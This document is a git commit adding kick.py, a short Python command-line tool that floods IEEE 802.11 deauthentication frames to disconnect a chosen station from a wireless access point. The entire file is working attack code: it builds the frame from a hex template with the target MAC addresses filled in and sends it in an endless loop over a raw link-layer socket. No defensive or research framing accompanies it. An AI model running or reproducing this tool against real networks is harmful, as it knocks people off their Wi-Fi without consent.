d0d4999a068635315314f03464db2c02156818a3
Oelin <42823429+Oelin@users.noreply.github.com>
2019-09-08 15:06:52 +0100

    Add files via upload

---
+++ kick.py
@@ -0,0 +1,90 @@
+#!/usr/bin/env python3
+
+
+
+'''kick, conduct IEEE 802.11 deauthenticate attacks.
+
+Usage: kick <if> <wap> <sta>
+
+An attacker can force WPA supplicants to disconnect from a wireless
+access point by emitting fictitious deauthenticate packets.'''
+
+
+
+from socket import *
+from sys import argv
+
+
+
+# A template for generic 802.11 deauthenticate packets. Can't be 
+# bothered with the details of each feild.
+
+#deauth = '00000c000480000002001800c0003a01{0}{1}{0}706a0100'
+deauth = '00000d00048002000200010000c0003a01{0}{1}{0}706a0100'
+
+
+# Removes colons from a MAC string, leaving a string of hex which is
+# easy to work with.
+
+def mac(string):
+    return string.replace(':', str())
+
+
+
+# Constructs a deauthenticate packet with inserted WAP and STA MAC
+# addresses.
+
+def construct(wap, sta):
+
+    string = deauth.format(mac(wap), mac(sta))
+    packet = bytes.fromhex(string)
+
+    return packet
+
+
+
+# Repeatedly transmit a given packet using a certain network
+# interface.
+
+def flood(iface, packet):
+    # Create a raw socket able to transmit from the data link layer.
+
+    link = socket(AF_PACKET, SOCK_RAW, 0)
+    link.bind((iface, 0))
+
+    while True: 
+        link.send(packet)
+
+
+
+# Perform the deauthenticate attack. Construct a packet and flood the
+# target until an interrupt is recieved.
+
+def exploit(iface, wap, sta):
+    try:
+        packet = construct(wap, sta)
+        flood(iface, packet)
+
+    except:
+        return
+        
+
+
+# Program entry point: take in command line arguments and call
+# exploit() with them.
+
+def main():
+    if len(argv) == 4:
+
+        print('Starting deauthenticate attack. ^C to quit.')
+        exploit(*argv[1:])
+
+        print('Byte')
+
+    else:
+        print(__doc__)
+
+
+
+main()
+
